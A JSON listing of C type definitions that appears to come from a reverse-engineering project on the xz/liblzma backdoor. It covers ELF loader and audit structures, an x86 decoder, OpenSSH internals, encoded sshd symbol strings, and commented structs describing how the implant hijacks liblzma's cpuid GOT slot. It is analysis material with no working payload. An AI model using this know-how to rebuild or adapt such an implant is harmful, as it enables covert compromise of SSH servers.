{
  "version": 1,
  "preamble": [
    "#pragma once"
  ],
  "entries": [
    {
      "kind": "typedef",
      "names": [
        "ptrdiff_t"
      ],
      "code": "typedef long ptrdiff_t;"
    },
    {
      "kind": "typedef",
      "names": [
        "size_t"
      ],
      "code": "typedef unsigned long size_t;"
    },
    {
      "kind": "typedef",
      "names": [
        "ssize_t"
      ],
      "code": "typedef long ssize_t;"
    },
    {
      "kind": "typedef",
      "names": [
        "uintptr_t"
      ],
      "code": "typedef unsigned long uintptr_t;"
    },
    {
      "kind": "typedef",
      "names": [
        "intptr_t"
      ],
      "code": "typedef long intptr_t;"
    },
    {
      "kind": "typedef",
      "names": [
        "va_list"
      ],
      "code": "typedef void *va_list;"
    },
    {
      "kind": "typedef",
      "names": [
        "int8_t"
      ],
      "code": "typedef signed char int8_t;"
    },
    {
      "kind": "typedef",
      "names": [
        "uint8_t"
      ],
      "code": "typedef unsigned char uint8_t;"
    },
    {
      "kind": "typedef",
      "names": [
        "int16_t"
      ],
      "code": "typedef short int16_t;"
    },
    {
      "kind": "typedef",
      "names": [
        "uint16_t"
      ],
      "code": "typedef unsigned short uint16_t;"
    },
    {
      "kind": "typedef",
      "names": [
        "int32_t"
      ],
      "code": "typedef int int32_t;"
    },
    {
      "kind": "typedef",
      "names": [
        "uint32_t"
      ],
      "code": "typedef unsigned int uint32_t;"
    },
    {
      "kind": "typedef",
      "names": [
        "uchar"
      ],
      "code": "typedef unsigned char uchar;"
    },
    {
      "kind": "typedef",
      "names": [
        "code"
      ],
      "code": "typedef void code(void);"
    },
    {
      "kind": "typedef",
      "names": [
        "ushort"
      ],
      "code": "typedef unsigned short ushort;"
    },
    {
      "kind": "typedef",
      "names": [
        "uint"
      ],
      "code": "typedef unsigned int uint;"
    },
    {
      "kind": "typedef",
      "names": [
        "int64_t"
      ],
      "code": "typedef long long int64_t;"
    },
    {
      "kind": "typedef",
      "names": [
        "uint64_t"
      ],
      "code": "typedef unsigned long long uint64_t;"
    },
    {
      "kind": "typedef",
      "names": [
        "ulong"
      ],
      "code": "typedef unsigned long ulong;"
    },
    {
      "kind": "declaration",
      "names": [
        "hexdump"
      ],
      "code": "void hexdump(void *pAddressIn, long lSize);"
    },
    {
      "kind": "typedef",
      "names": [
        "u8"
      ],
      "code": "typedef uint8_t u8;"
    },
    {
      "kind": "typedef",
      "names": [
        "byte"
      ],
      "code": "typedef unsigned char byte;"
    },
    {
      "kind": "typedef",
      "names": [
        "sbyte"
      ],
      "code": "typedef signed char sbyte;"
    },
    {
      "kind": "typedef",
      "names": [
        "undefined"
      ],
      "code": "typedef unsigned char undefined;"
    },
    {
      "kind": "typedef",
      "names": [
        "undefined1"
      ],
      "code": "typedef unsigned char undefined1;"
    },
    {
      "kind": "typedef",
      "names": [
        "undefined2"
      ],
      "code": "typedef unsigned short undefined2;"
    },
    {
      "kind": "typedef",
      "names": [
        "undefined3"
      ],
      "code": "typedef uint32_t undefined3;"
    },
    {
      "kind": "typedef",
      "names": [
        "undefined4"
      ],
      "code": "typedef uint32_t undefined4;"
    },
    {
      "kind": "typedef",
      "names": [
        "undefined7"
      ],
      "code": "typedef uint64_t undefined7;"
    },
    {
      "kind": "typedef",
      "names": [
        "undefined8"
      ],
      "code": "typedef uint64_t undefined8;"
    },
    {
      "kind": "typedef",
      "names": [
        "u16"
      ],
      "code": "typedef uint16_t u16;"
    },
    {
      "kind": "typedef",
      "names": [
        "u32"
      ],
      "code": "typedef uint32_t u32;"
    },
    {
      "kind": "typedef",
      "names": [
        "u64"
      ],
      "code": "typedef uint64_t u64;"
    },
    {
      "kind": "typedef",
      "names": [
        "uptr"
      ],
      "code": "typedef uintptr_t uptr;"
    },
    {
      "kind": "typedef",
      "names": [
        "pid_t"
      ],
      "code": "typedef unsigned int pid_t;"
    },
    {
      "kind": "typedef",
      "names": [
        "uid_t"
      ],
      "code": "typedef unsigned int uid_t;"
    },
    {
      "kind": "typedef",
      "names": [
        "gid_t"
      ],
      "code": "typedef unsigned int gid_t;"
    },
    {
      "kind": "typedef",
      "names": [
        "mode_t"
      ],
      "code": "typedef unsigned int mode_t;"
    },
    {
      "kind": "typedef",
      "names": [
        "Elf64_Half"
      ],
      "code": "typedef uint16_t Elf64_Half;"
    },
    {
      "kind": "typedef",
      "names": [
        "Elf64_Word"
      ],
      "code": "typedef uint32_t Elf64_Word;"
    },
    {
      "kind": "typedef",
      "names": [
        "Elf64_Sword"
      ],
      "code": "typedef int32_t Elf64_Sword;"
    },
    {
      "kind": "typedef",
      "names": [
        "Elf64_Xword"
      ],
      "code": "typedef uint64_t Elf64_Xword;"
    },
    {
      "kind": "typedef",
      "names": [
        "Elf64_Sxword"
      ],
      "code": "typedef int64_t Elf64_Sxword;"
    },
    {
      "kind": "typedef",
      "names": [
        "Elf32_Addr"
      ],
      "code": "typedef uint32_t Elf32_Addr;"
    },
    {
      "kind": "typedef",
      "names": [
        "Elf64_Addr"
      ],
      "code": "typedef uint64_t Elf64_Addr;"
    },
    {
      "kind": "typedef",
      "names": [
        "Elf64_Off"
      ],
      "code": "typedef uint64_t Elf64_Off;"
    },
    {
      "kind": "typedef",
      "names": [
        "Elf64_Section"
      ],
      "code": "typedef uint16_t Elf64_Section;"
    },
    {
      "kind": "typedef",
      "names": [
        "Elf64_Relr"
      ],
      "code": "typedef Elf64_Xword Elf64_Relr;"
    },
    {
      "kind": "struct",
      "names": [
        "Elf64_Ehdr"
      ],
      "code": "typedef struct\n{\n  unsigned char e_ident[(16)];\n  Elf64_Half e_type;\n  Elf64_Half e_machine;\n  Elf64_Word e_version;\n  Elf64_Addr e_entry;\n  Elf64_Off e_phoff;\n  Elf64_Off e_shoff;\n  Elf64_Word e_flags;\n  Elf64_Half e_ehsize;\n  Elf64_Half e_phentsize;\n  Elf64_Half e_phnum;\n  Elf64_Half e_shentsize;\n  Elf64_Half e_shnum;\n  Elf64_Half e_shstrndx;\n} Elf64_Ehdr;"
    },
    {
      "kind": "struct",
      "names": [
        "Elf64_Phdr"
      ],
      "code": "typedef struct\n{\n  Elf64_Word p_type;\n  Elf64_Word p_flags;\n  Elf64_Off p_offset;\n  Elf64_Addr p_vaddr;\n  Elf64_Addr p_paddr;\n  Elf64_Xword p_filesz;\n  Elf64_Xword p_memsz;\n  Elf64_Xword p_align;\n} Elf64_Phdr;"
    },
    {
      "kind": "typedef",
      "names": [
        "Elf64_DynValue"
      ],
      "code": "typedef union\n{\n  Elf64_Xword d_val;\n  Elf64_Addr d_ptr;\n} Elf64_DynValue;"
    },
    {
      "kind": "struct",
      "names": [
        "Elf64_Dyn"
      ],
      "code": "typedef struct\n{\n  Elf64_Sxword d_tag;\n  Elf64_DynValue d_un;\n} Elf64_Dyn;"
    },
    {
      "kind": "struct",
      "names": [
        "Elf64_Sym"
      ],
      "code": "typedef struct\n{\n  Elf64_Word st_name;\n  unsigned char st_info;\n  unsigned char st_other;\n  Elf64_Section st_shndx;\n  Elf64_Addr st_value;\n  Elf64_Xword st_size;\n} Elf64_Sym;"
    },
    {
      "kind": "struct",
      "names": [
        "Elf64_Rela"
      ],
      "code": "typedef struct\n{\n  Elf64_Addr r_offset;\n  Elf64_Xword r_info;\n  Elf64_Sxword r_addend;\n} Elf64_Rela;"
    },
    {
      "kind": "typedef",
      "names": [
        "Elf32_Sym",
        "Elf64_Relr",
        "Elf64_Verdef",
        "Elf64_Versym",
        "sigset_t",
        "fd_set"
      ],
      "code": "typedef uptr\n Elf32_Sym, Elf64_Relr,\n Elf64_Verdef, Elf64_Versym, sigset_t, fd_set;"
    },
    {
      "kind": "struct",
      "names": [
        "EVP_PKEY"
      ],
      "code": "typedef struct evp_pkey_st EVP_PKEY;"
    },
    {
      "kind": "struct",
      "names": [
        "RSA"
      ],
      "code": "typedef struct rsa_st RSA;"
    },
    {
      "kind": "struct",
      "names": [
        "DSA"
      ],
      "code": "typedef struct dsa_st DSA;"
    },
    {
      "kind": "struct",
      "names": [
        "BIGNUM"
      ],
      "code": "typedef struct bignum_st BIGNUM;"
    },
    {
      "kind": "struct",
      "names": [
        "EC_POINT"
      ],
      "code": "typedef struct ec_point_st EC_POINT;"
    },
    {
      "kind": "struct",
      "names": [
        "EC_KEY"
      ],
      "code": "typedef struct ec_key_st EC_KEY;"
    },
    {
      "kind": "struct",
      "names": [
        "EC_GROUP"
      ],
      "code": "typedef struct ec_group_st EC_GROUP;"
    },
    {
      "kind": "struct",
      "names": [
        "EVP_MD"
      ],
      "code": "typedef struct evp_md_st EVP_MD;"
    },
    {
      "kind": "struct",
      "names": [
        "EVP_CIPHER"
      ],
      "code": "typedef struct evp_cipher_st EVP_CIPHER;"
    },
    {
      "kind": "struct",
      "names": [
        "EVP_CIPHER_CTX"
      ],
      "code": "typedef struct evp_cipher_ctx_st EVP_CIPHER_CTX;"
    },
    {
      "kind": "struct",
      "names": [
        "ENGINE"
      ],
      "code": "typedef struct engine_st ENGINE;"
    },
    {
      "kind": "struct",
      "names": [
        "EVP_MD_CTX"
      ],
      "code": "typedef struct evp_md_ctx_st EVP_MD_CTX;"
    },
    {
      "kind": "struct",
      "names": [
        "EVP_PKEY_CTX"
      ],
      "code": "typedef struct evp_pkey_ctx_st EVP_PKEY_CTX;"
    },
    {
      "kind": "struct",
      "names": [
        "BN_CTX"
      ],
      "code": "typedef struct bignum_ctx BN_CTX;"
    },
    {
      "kind": "typedef",
      "names": [
        "point_conversion_form_t"
      ],
      "code": "typedef unsigned int point_conversion_form_t;"
    },
    {
      "kind": "typedef",
      "names": [
        "lzma_alloc_fn"
      ],
      "code": "typedef void *(*lzma_alloc_fn)(void *opaque, size_t nmemb, size_t size);"
    },
    {
      "kind": "typedef",
      "names": [
        "lzma_free_fn"
      ],
      "code": "typedef void (*lzma_free_fn)(void *opaque, void *ptr);"
    },
    {
      "kind": "struct",
      "names": [
        "lzma_allocator"
      ],
      "code": "typedef struct {\n lzma_alloc_fn alloc;\n lzma_free_fn free;\n void *opaque;\n} lzma_allocator;"
    },
    {
      "kind": "typedef",
      "names": [
        "Lmid_t"
      ],
      "code": "typedef long int Lmid_t;"
    },
    {
      "kind": "enum",
      "names": [
        "lzma_check"
      ],
      "code": "typedef enum {\n LZMA_CHECK_NONE = 0,\n LZMA_CHECK_CRC32 = 1,\n LZMA_CHECK_CRC64 = 4,\n LZMA_CHECK_SHA256 = 10\n} lzma_check;"
    },
    {
      "kind": "struct",
      "names": [
        "auditstate"
      ],
      "code": "struct auditstate\n{\n   uintptr_t cookie;\n   unsigned int bindflags;\n};"
    },
    {
      "kind": "struct",
      "names": [
        "lookup_t"
      ],
      "code": "typedef struct link_map *lookup_t;"
    },
    {
      "kind": "typedef",
      "names": [
        "link_map"
      ],
      "code": "typedef struct link_map {\n unsigned char _opaque;\n} link_map;"
    },
    {
      "kind": "struct",
      "names": [
        "gnu_hash_table_t"
      ],
      "code": "typedef struct gnu_hash_table {\n uint32_t nbuckets;\n uint32_t symoffset;\n uint32_t bloom_size;\n uint32_t bloom_shift;\n uint64_t bloom[];\n} gnu_hash_table_t;"
    },
    {
      "kind": "struct",
      "names": [
        "La_i86_regs"
      ],
      "code": "struct La_i86_regs;"
    },
    {
      "kind": "struct",
      "names": [
        "La_i86_retval"
      ],
      "code": "struct La_i86_retval;"
    },
    {
      "kind": "struct",
      "names": [
        "La_x86_64_regs"
      ],
      "code": "struct La_x86_64_regs;"
    },
    {
      "kind": "struct",
      "names": [
        "La_x86_64_retval"
      ],
      "code": "struct La_x86_64_retval;"
    },
    {
      "kind": "struct",
      "names": [
        "La_x32_regs"
      ],
      "code": "struct La_x32_regs;"
    },
    {
      "kind": "struct",
      "names": [
        "La_x32_retval"
      ],
      "code": "struct La_x32_retval;"
    },
    {
      "kind": "typedef",
      "names": [
        "audit_activity_fn"
      ],
      "code": "typedef void (*audit_activity_fn)(uintptr_t *, unsigned int);"
    },
    {
      "kind": "typedef",
      "names": [
        "audit_objsearch_fn"
      ],
      "code": "typedef char *(*audit_objsearch_fn)(const char *, uintptr_t *, unsigned int);"
    },
    {
      "kind": "typedef",
      "names": [
        "audit_objopen_fn"
      ],
      "code": "typedef unsigned int (*audit_objopen_fn)(struct link_map *, Lmid_t, uintptr_t *);"
    },
    {
      "kind": "typedef",
      "names": [
        "audit_preinit_fn"
      ],
      "code": "typedef void (*audit_preinit_fn)(uintptr_t *);"
    },
    {
      "kind": "typedef",
      "names": [
        "audit_objclose_fn"
      ],
      "code": "typedef unsigned int (*audit_objclose_fn)(uintptr_t *);"
    },
    {
      "kind": "typedef",
      "names": [
        "dl_audit_symbind_alt_fn"
      ],
      "code": "typedef void (*dl_audit_symbind_alt_fn)(struct link_map *l, const Elf64_Sym *ref, void **value, lookup_t result);"
    },
    {
      "kind": "typedef",
      "names": [
        "audit_symbind64_fn"
      ],
      "code": "typedef uintptr_t (*audit_symbind64_fn)(\n  Elf64_Sym *sym, unsigned int ndx,\n  uptr *refcook, uptr *defcook,\n  unsigned int flags, const char *symname);"
    },
    {
      "kind": "typedef",
      "names": [
        "audit_symbind_fn_t"
      ],
      "code": "typedef union {\n  uintptr_t (*symbind32) (Elf32_Sym *, unsigned int, uintptr_t *,\n   uintptr_t *, unsigned int *, const char *);\n  uintptr_t (*symbind64) (Elf64_Sym *, unsigned int, uintptr_t *,\n   uintptr_t *, unsigned int *, const char *);\n } audit_symbind_fn_t;"
    },
    {
      "kind": "typedef",
      "names": [
        "audit_pltenter_fn_t"
      ],
      "code": "typedef union {\n  Elf32_Addr (*i86_gnu_pltenter) (Elf32_Sym *, unsigned int, uintptr_t *,\n   uintptr_t *, struct La_i86_regs *,\n   unsigned int *, const char *name,\n   long int *framesizep);\n  Elf64_Addr (*x86_64_gnu_pltenter) (Elf64_Sym *, unsigned int,\n   uintptr_t *,\n   uintptr_t *, struct La_x86_64_regs *,\n   unsigned int *, const char *name,\n   long int *framesizep);\n  Elf32_Addr (*x32_gnu_pltenter) (Elf32_Sym *, unsigned int, uintptr_t *,\n   uintptr_t *, struct La_x32_regs *,\n   unsigned int *, const char *name,\n   long int *framesizep);\n } audit_pltenter_fn_t;"
    },
    {
      "kind": "typedef",
      "names": [
        "audit_pltexit_fn_t"
      ],
      "code": "typedef union {\n   unsigned int (*i86_gnu_pltexit) (Elf32_Sym *, unsigned int, uintptr_t *,\n   uintptr_t *, const struct La_i86_regs *,\n   struct La_i86_retval *, const char *);\n  unsigned int (*x86_64_gnu_pltexit) (Elf64_Sym *, unsigned int,\n   uintptr_t *,\n   uintptr_t *,\n   const struct La_x86_64_regs *,\n   struct La_x86_64_retval *,\n   const char *);\n  unsigned int (*x32_gnu_pltexit) (Elf32_Sym *, unsigned int, uintptr_t *,\n   uintptr_t *,\n   const struct La_x32_regs *,\n   struct La_x86_64_retval *,\n   const char *);\n } audit_pltexit_fn_t;"
    },
    {
      "kind": "struct",
      "names": [
        "audit_ifaces"
      ],
      "code": "struct audit_ifaces\n{\n audit_activity_fn activity;\n audit_objsearch_fn objsearch;\n audit_objopen_fn objopen;\n audit_preinit_fn preinit;\n audit_symbind_fn_t symbind;\n audit_pltenter_fn_t pltenter;\n audit_pltexit_fn_t pltexit;\n audit_objclose_fn objclose;\n struct audit_ifaces *next;\n};"
    },
    {
      "kind": "typedef",
      "names": [
        "audit_ifaces"
      ],
      "code": "typedef struct audit_ifaces audit_ifaces;"
    },
    {
      "kind": "struct",
      "names": [
        "lzma_sha256_state"
      ],
      "code": "typedef struct {\n uint32_t state[8];\n uint64_t size;\n} lzma_sha256_state;"
    },
    {
      "kind": "struct",
      "names": [
        "lzma_check_state"
      ],
      "code": "typedef struct {\n uint8_t buffer[64];\n union {\n  uint32_t crc32;\n  uint64_t crc64;\n  lzma_sha256_state sha256;\n } state;\n} lzma_check_state;"
    },
    {
      "kind": "enum",
      "names": [
        "X86_OPCODE"
      ],
      "code": "enum X86_OPCODE {\n X86_OPCODE_LEA = 0x8D,\n X86_OPCODE_CALL = 0xE8,\n X86_OPCODE_CMP = 0x3B,\n X86_OPCODE_MOV = 0x89,\n X86_OPCODE_MOV_LOAD = 0x8B,\n X86_OPCODE_MOV_STORE = 0x8C\n};"
    },
    {
      "kind": "enum",
      "names": [
        "X86_REG"
      ],
      "code": "enum X86_REG {\n X86_REG_RBP = 5\n};"
    },
    {
      "kind": "enum",
      "names": [
        "BOOL"
      ],
      "code": "typedef enum {\n FALSE = 0,\n TRUE = 1\n} BOOL;"
    },
    {
      "kind": "enum",
      "names": [
        "InstructionFlags"
      ],
      "code": "typedef enum {\n DF1_LOCK_REP = 1,\n DF1_SEG = 2,\n DF1_OSIZE = 4,\n DF1_ASIZE = 8,\n DF1_VEX = 0x10,\n DF1_REX = 0x20,\n DF1_MODRM = 0x40,\n DF1_SIB = 0x80\n} InstructionFlags;"
    },
    {
      "kind": "enum",
      "names": [
        "InstructionFlags2"
      ],
      "code": "typedef enum {\n DF2_MEM_DISP = 0x1,\n DF2_MEM_DISP8 = 0x2,\n DF2_MEM_SEG_OFFS = 0x4,\n DF2_FLAGS_MEM = DF2_MEM_DISP | DF2_MEM_DISP8 | DF2_MEM_SEG_OFFS,\n DF2_IMM = 0x8,\n DF2_IMM64 = 0x10\n} InstructionFlags2;"
    },
    {
      "kind": "enum",
      "names": [
        "ElfFlags"
      ],
      "code": "typedef enum {\n X_ELF_PLTREL = 0x1,\n X_ELF_RELA = 0x2,\n X_ELF_RELR = 0x4,\n X_ELF_VERDEF = 0x8,\n X_ELF_VERSYM = 0x10,\n X_ELF_NOW = 0x20\n} ElfFlags;"
    },
    {
      "kind": "enum",
      "names": [
        "ModRm_Mod"
      ],
      "code": "typedef enum {\n MRM_I_REG,\n MRM_I_DISP1,\n MRM_I_DISP4,\n MRM_D_REG\n} ModRm_Mod;"
    },
    {
      "kind": "enum",
      "names": [
        "FuncFindType"
      ],
      "code": "typedef enum {\n FIND_ENDBR64,\n FIND_NOP\n} FuncFindType;"
    },
    {
      "kind": "enum",
      "names": [
        "ElfId"
      ],
      "code": "typedef enum {\n X_ELF_MAIN = 0,\n X_ELF_DYNAMIC_LINKER = 1,\n X_ELF_LIBC = 2,\n X_ELF_LIBCRYPTO = 3\n} ElfId;"
    },
    {
      "kind": "enum",
      "names": [
        "StringXrefId"
      ],
      "code": "typedef enum {\n XREF_xcalloc_zero_size = 0,\n XREF_Could_not_chdir_to_home_directory_s_s = 1,\n XREF_list_hostkey_types = 2,\n XREF_demote_sensitive_data = 3,\n XREF_mm_terminate = 4,\n XREF_mm_pty_allocate = 5,\n XREF_mm_do_pam_account = 6,\n XREF_mm_session_pty_cleanup2 = 7,\n XREF_mm_getpwnamallow = 8,\n XREF_mm_sshpam_init_ctx = 9,\n XREF_mm_sshpam_query = 10,\n XREF_mm_sshpam_respond = 11,\n XREF_mm_sshpam_free_ctx = 12,\n XREF_mm_choose_dh = 13,\n XREF_sshpam_respond = 14,\n XREF_sshpam_auth_passwd = 15,\n XREF_sshpam_query = 16,\n XREF_start_pam = 17,\n XREF_mm_request_send = 18,\n XREF_mm_log_handler = 19,\n XREF_Could_not_get_agent_socket = 20,\n XREF_auth_root_allowed = 21,\n XREF_mm_answer_authpassword = 22,\n XREF_mm_answer_keyallowed = 23,\n XREF_mm_answer_keyverify = 24,\n XREF_48s_48s_d_pid_ld_ = 25,\n XREF_Unrecognized_internal_syslog_level_code_d = 26\n} StringXrefId;"
    },
    {
      "kind": "enum",
      "names": [
        "EncodedStringId"
      ],
      "code": "typedef enum {\n STR_from = 0x810,\n STR_ssh2 = 0x678,\n STR_48s_48s_d_pid_ld_ = 0xd8,\n STR_s = 0x708,\n STR_usr_sbin_sshd = 0x108,\n STR_Accepted_password_for = 0x870,\n STR_Accepted_publickey_for = 0x1a0,\n STR_BN_bin2bn = 0xc40,\n STR_BN_bn2bin = 0x6d0,\n STR_BN_dup = 0x958,\n STR_BN_free = 0x418,\n STR_BN_num_bits = 0x4e0,\n STR_Connection_closed_by = 0x790,\n STR_Could_not_chdir_to_home_directory_s_s = 0x18,\n STR_Could_not_get_agent_socket = 0xb0,\n STR_DISPLAY = 0x960,\n STR_DSA_get0_pqg = 0x9d0,\n STR_DSA_get0_pub_key = 0x468,\n STR_EC_KEY_get0_group = 0x7e8,\n STR_EC_KEY_get0_public_key = 0x268,\n STR_EC_POINT_point2oct = 0x6e0,\n STR_EVP_CIPHER_CTX_free = 0xb28,\n STR_EVP_CIPHER_CTX_new = 0x838,\n STR_EVP_DecryptFinal_ex = 0x2a8,\n STR_EVP_DecryptInit_ex = 0xc08,\n STR_EVP_DecryptUpdate = 0x3f0,\n STR_EVP_Digest = 0xf8,\n STR_EVP_DigestVerify = 0x408,\n STR_EVP_DigestVerifyInit = 0x118,\n STR_EVP_MD_CTX_free = 0xd10,\n STR_EVP_MD_CTX_new = 0xaf8,\n STR_EVP_PKEY_free = 0x6f8,\n STR_EVP_PKEY_new_raw_public_key = 0x758,\n STR_EVP_PKEY_set1_RSA = 0x510,\n STR_EVP_chacha20 = 0xc28,\n STR_EVP_sha256 = 0xc60,\n STR_EVP_sm = 0x188,\n STR_GLIBC_2_2_5 = 0x8c0,\n STR_GLRO_dl_naudit_naudit = 0x6a8,\n STR_KRB5CCNAME = 0x1e0,\n STR_LD_AUDIT = 0xcf0,\n STR_LD_BIND_NOT = 0xbc0,\n STR_LD_DEBUG = 0xa90,\n STR_LD_PROFILE = 0xb98,\n STR_LD_USE_LOAD_BIAS = 0x3e0,\n STR_LINES = 0xa88,\n STR_RSA_free = 0xac0,\n STR_RSA_get0_key = 0x798,\n STR_RSA_new = 0x918,\n STR_RSA_public_decrypt = 0x1d0,\n STR_RSA_set0_key = 0x540,\n STR_RSA_sign = 0x8f8,\n STR_SSH_2_0 = 0x990,\n STR_TERM = 0x4a8,\n STR_Unrecognized_internal_syslog_level_code_d = 0xe0,\n STR_WAYLAND_DISPLAY = 0x158,\n STR_errno_location = 0x878,\n STR_libc_stack_end = 0x2b0,\n STR_libc_start_main = 0x228,\n STR_dl_audit_preinit = 0xa60,\n STR_dl_audit_symbind_alt = 0x9c8,\n STR_exit = 0x8a8,\n STR_r_debug = 0x5b0,\n STR_rtld_global = 0x5b8,\n STR_rtld_global_ro = 0xa98,\n STR_auth_root_allowed = 0xb8,\n STR_authenticating = 0x1d8,\n STR_demote_sensitive_data = 0x28,\n STR_getuid = 0x348,\n STR_ld_linux_x86_64_so = 0xa48,\n STR_libc_so = 0x7d0,\n STR_libcrypto_so = 0x7c0,\n STR_liblzma_so = 0x590,\n STR_libsystemd_so = 0x938,\n STR_list_hostkey_types = 0x20,\n STR_malloc_usable_size = 0x440,\n STR_mm_answer_authpassword = 0xc0,\n STR_mm_answer_keyallowed = 0xc8,\n STR_mm_answer_keyverify = 0xd0,\n STR_mm_answer_pam_start = 0x948,\n STR_mm_choose_dh = 0x78,\n STR_mm_do_pam_account = 0x40,\n STR_mm_getpwnamallow = 0x50,\n STR_mm_log_handler = 0xa8,\n STR_mm_pty_allocate = 0x38,\n STR_mm_request_send = 0xa0,\n STR_mm_session_pty_cleanup2 = 0x48,\n STR_mm_sshpam_free_ctx = 0x70,\n STR_mm_sshpam_init_ctx = 0x58,\n STR_mm_sshpam_query = 0x60,\n STR_mm_sshpam_respond = 0x68,\n STR_mm_terminate = 0x30,\n STR_parse_PAM = 0xc58,\n STR_password = 0x400,\n STR_preauth = 0x4f0,\n STR_pselect = 0x690,\n STR_publickey = 0x7b8,\n STR_read = 0x308,\n STR_rsa_sha2_256 = 0x710,\n STR_setlogmask = 0x428,\n STR_setresgid = 0x5f0,\n STR_setresuid = 0xab8,\n STR_shutdown = 0x760,\n STR_ssh_2_0 = 0xd08,\n STR_ssh_rsa_cert_v01_openssh_com = 0x2c8,\n STR_sshpam_auth_passwd = 0x88,\n STR_sshpam_query = 0x90,\n STR_sshpam_respond = 0x80,\n STR_start_pam = 0x98,\n STR_system = 0x9f8,\n STR_unknown = 0x198,\n STR_user = 0xb10,\n STR_write = 0x380,\n STR_xcalloc_zero_size = 0x10,\n STR_yolAbejyiejuvnupEvjtgvsh5okmkAvj = 0xb00,\n STR_ELF = 0x300,\n} EncodedStringId;"
    },
    {
      "kind": "enum",
      "names": [
        "PayloadState"
      ],
      "code": "typedef enum {\n PAYLOAD_STATE_INITIAL = -1\n} PayloadState;"
    },
    {
      "kind": "struct",
      "names": [
        "sshbuf"
      ],
      "code": "struct sshbuf {\n u8 *d;\n const u8 *cd;\n size_t off;\n size_t size;\n size_t max_size;\n size_t alloc;\n int readonly;\n u32 refcount;\n struct sshbuf *parent;\n};"
    },
    {
      "kind": "struct",
      "names": [
        "kex"
      ],
      "code": "struct kex {\n u8 opaque;\n};"
    },
    {
      "kind": "typedef",
      "names": [
        "kex"
      ],
      "code": "typedef struct kex kex;"
    },
    {
      "kind": "struct",
      "names": [
        "monitor"
      ],
      "code": "struct monitor {\n int child_to_monitor_fd; /* sshd child writes monitor RPCs to this pipe; monitor reads replies back when forging requests (DIR_WRITE). */\n int monitor_to_child_fd; /* Monitor thread writes responses here; child reads them when draining forged packets (DIR_READ). */\n int log_child_to_monitor_fd; /* Logging channel equivalent of child_to_monitor_fd (used by sshd_log/mm_log_handler). */\n int log_monitor_to_child_fd; /* Logging channel equivalent of monitor_to_child_fd so mm_log_handler can read monitor output. */\n struct kex **pkex_table; /* Pointer to the monitor's pkex table (array of sshbuf-backed kex records discovered via sshd_offsets). */\n pid_t monitor_pid; /* Process ID of the active monitor helper once privsep spins up. */\n};"
    },
    {
      "kind": "typedef",
      "names": [
        "monitor"
      ],
      "code": "typedef struct monitor monitor;"
    },
    {
      "kind": "struct",
      "names": [
        "sensitive_data"
      ],
      "code": "struct sensitive_data {\n struct sshkey **host_keys;\n struct sshkey **host_pubkeys;\n struct sshkey **host_certificates;\n int have_ssh2_key;\n};"
    },
    {
      "kind": "typedef",
      "names": [
        "sensitive_data"
      ],
      "code": "typedef struct sensitive_data sensitive_data;"
    },
    {
      "kind": "struct",
      "names": [
        "sshkey"
      ],
      "code": "struct sshkey {\n int type;\n int flags;\n RSA *rsa;\n DSA *dsa;\n int ecdsa_nid;\n EC_KEY *ecdsa;\n u8 *ed25519_sk;\n u8 *ed25519_pk;\n char *xmss_name;\n char *xmss_filename;\n void *xmss_state;\n u8 *xmss_sk;\n u8 *xmss_pk;\n char sk_application;\n u8 sk_flags;\n struct sshbuf *sk_key_handle;\n struct sshbuf *sk_reserved;\n struct sshkey_cert *cert;\n u8 *shielded_private;\n size_t shielded_len;\n u8 *shield_prekey;\n size_t shield_prekey_len;\n};"
    },
    {
      "kind": "typedef",
      "names": [
        "sshkey"
      ],
      "code": "typedef struct sshkey sshkey;"
    },
    {
      "kind": "struct",
      "names": [
        "got_ctx_t"
      ],
      "code": "typedef struct __attribute__((packed)) got_ctx {\n void *tls_got_entry; /* Seeded with the expected __tls_get_addr PLT displacement (0x2600) and overwritten with the resolved GOT slot pointer once the stub is parsed. */\n void *cpuid_got_slot; /* Captures the resolver’s saved return-address slot until it is repointed at the cpuid GOT entry being hijacked. */\n u64 cpuid_slot_index; /* GOT index for liblzma’s cpuid resolver; used to stride from the __tls_get_addr anchor to the cpuid slot when patching. */\n ptrdiff_t got_base_offset; /* Offset from the randomized GOT base to the cpuid relocation anchor; subtracting it from `cpuid_random_symbol_addr` recreates the GOT base (also reused as the TLS anchor while locating the PLT stub). */\n} got_ctx_t;"
    },
    {
      "kind": "struct",
      "names": [
        "elf_entry_ctx_t"
      ],
      "code": "typedef struct __attribute__((packed)) elf_entry_ctx {\n void *cpuid_random_symbol_addr; /* Runtime VA of the `cpuid_random_symbol` relocation; subtracting `got_ctx.got_base_offset` recreates the GOT base for the cpuid trampolines. */\n got_ctx_t got_ctx; /* Tracks the __tls_get_addr GOT anchor, the cpuid slot pointer/index, and the relocation offset while stage one rewrites the resolver. */\n u64 *resolver_frame; /* Points to the resolver’s saved frame slots on entry; after init this field is repurposed to stash the cpuid GOT slot pointer that stage two patches. */\n} elf_entry_ctx_t;"
    },
    {
      "kind": "enum",
      "names": [
        "dasm_modrm_mask"
      ],
      "code": "enum dasm_modrm_mask {\n XZ_MODRM_RM = 0xFF000000,\n XZ_MODRM_REG = 0x00FF0000,\n XZ_MODRM_MOD = 0x0000FF00,\n XZ_MODRM_RAW = 0x000000FF\n};"
    },
    {
      "kind": "typedef",
      "names": [
        "x86_rex_prefix_t"
      ],
      "code": "typedef union __attribute__((packed)) {\n struct __attribute__((packed)) {\n  u8 B : 1;\n  u8 X : 1;\n  u8 R : 1;\n  u8 W : 1;\n  u8 BitPattern : 4;\n } bits;\n u8 rex_byte;\n} x86_rex_prefix_t;"
    },
    {
      "kind": "typedef",
      "names": [
        "x86_modrm_info_t"
      ],
      "code": "typedef union __attribute__((packed)) {\n struct __attribute__((packed)) {\n  u8 modrm;\n  u8 modrm_mod;\n  u8 modrm_reg;\n  u8 modrm_rm;\n } breakdown;\n u32 modrm_word;\n} x86_modrm_info_t;"
    },
    {
      "kind": "typedef",
      "names": [
        "x86_prefix_fields_t"
      ],
      "code": "typedef struct __attribute__((packed)) {\n u8 flags;\n u8 flags2;\n u8 prefix_padding[2];\n u8 lock_rep_byte;\n u8 seg_byte;\n u8 osize_byte;\n u8 asize_byte;\n u8 vex_byte;\n u8 vex_byte2;\n u8 vex_byte3;\n x86_rex_prefix_t rex;\n x86_modrm_info_t modrm;\n} x86_prefix_fields_t;"
    },
    {
      "kind": "typedef",
      "names": [
        "x86_prefix_state_t"
      ],
